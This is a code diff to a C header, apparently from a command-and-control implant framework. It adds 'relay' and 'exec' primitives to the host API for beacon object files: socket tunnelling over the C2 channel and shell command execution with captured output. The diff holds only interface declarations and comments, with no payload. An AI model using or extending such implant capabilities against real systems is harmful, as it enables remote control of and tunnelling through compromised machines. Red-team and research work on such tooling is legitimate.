@@ -50,6 +50,28 @@ typedef int (*c2_bof_upload_fn)(void *ctx, const char *token, const char *path,
 typedef int (*c2_bof_sha256_fn)(void *ctx, const uint8_t *data, size_t len,
                                 char *hex, size_t hex_cap, char *err,
                                 int err_cap);
+/* Pipe an already-connected socket to the C2 stream named by `token`.
+ *
+ * The primitive owns nothing but the transport: the BOF parses its arguments,
+ * resolves and dials the endpoint, and reports its own errors. It takes
+ * ownership of `fd` and returns as soon as the relay is running; the agent then
+ * closes both ends when either side finishes or the relay has been idle for
+ * `idle_seconds`. The relay runs on an agent thread because the loader unmaps a
+ * BOF object once its entry point returns, and the RV32 guest is single
+ * threaded. */
+typedef int (*c2_bof_relay_fn)(void *ctx, const char *token, int fd,
+                               int idle_seconds, char *err, int err_cap);
+/* Run `cmd` and capture its combined output.
+ *
+ * `shell` selects the execution model: non-zero runs `cmd` through `/bin/sh
+ * -c`, zero splits `cmd` into words (quotes and backslashes, no expansion) and
+ * executes the first word directly. The call is synchronous: the agent's
+ * message loop waits for the process, as it does for the other host
+ * primitives. It returns when the process exits, when its output fills `out`,
+ * or when the agent-side deadline expires; the output is NUL terminated at
+ * `out[ret]`. Returns the number of bytes written, or a negative status. */
+typedef int (*c2_bof_exec_fn)(void *ctx, const char *cmd, int shell, char *out,
+                              size_t out_cap, char *err, int err_cap);
 
 typedef struct {
   void *ctx;
@@ -57,6 +79,8 @@ typedef struct {
   c2_bof_write_fn write;
   c2_bof_upload_fn upload;
   c2_bof_sha256_fn sha256;
+  c2_bof_relay_fn relay;
+  c2_bof_exec_fn exec;
 } c2_bof_host;
 
 /*
